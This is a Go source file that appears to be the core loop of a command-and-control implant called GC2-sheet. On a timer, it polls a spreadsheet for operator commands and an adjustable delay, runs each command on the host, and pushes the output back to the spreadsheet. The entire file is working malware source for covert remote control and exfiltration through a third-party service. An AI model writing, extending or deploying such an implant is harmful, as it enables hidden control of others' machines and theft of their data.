package C2

import (
	"GC2-sheet/internal/utils"
	"fmt"
	"strconv"
	"time"
)

func Run() {
	commandExecutor, fileSystem, err := provideCommandExecutorAndFileSystem()
	if err != nil {
		panic(err)
	}

	commandExecutor.appendEmptyCommand()
	ticker := time.NewTicker(time.Duration(DefaultTickerDuration) * time.Second)

	for {
		select {
		case <-ticker.C:
			go func() {
				lastCommand := commandExecutor.getLastCommand()
				commandToExecute := ""

				// If last command has empty Input we need to get the new command from the spreadsheet
				if lastCommand.Input == "" {
					// command to execute (can be ""), and delay for the ticker
					var newTicker int
					commandToExecute, newTicker, err = commandExecutor.pullCommandAndTicker()
					// Get new ticker value and update Ticker if not 0
					if err != nil {
						utils.LogDebug("[-] Failed to pull new command and ticker: " + err.Error())
						return
					} else if newTicker <= 0 {
						utils.LogDebug(fmt.Sprintf(
							"[-] Invalid ticker: %ds (potentially no new command), using previous value",
							newTicker,
						))
					} else { // Update ticker if value has changed
						utils.LogDebug("[+] Updated ticker delay: " + strconv.Itoa(newTicker) + "(s)")
						lastCommand.Ticker = newTicker
						ticker.Reset(time.Duration(newTicker) * time.Second)
					}
				}

				// If no command end the thread
				if commandToExecute == "" {
					utils.LogDebug("No new command")
					return
				}

				utils.LogDebug("New command: " + commandToExecute)

				// Set new retrieved command
				lastCommand.Input = commandToExecute

				// Create new empty command before performing the current one (to avoid deadlock on command execution)
				commandExecutor.appendEmptyCommand()

				// Execute the command
				localCommandExecution(fileSystem, lastCommand)

				// Write result on spreadsheet (result is stored in the current command structure)
				err := commandExecutor.pushOutput(lastCommand)
				if err != nil {
					utils.LogDebug("[-] Failed to push new command: " + err.Error())
				} else {
					utils.LogDebug("[+] Command successfully pushed: " + lastCommand.Output)
				}
			}()
		}
	}
}
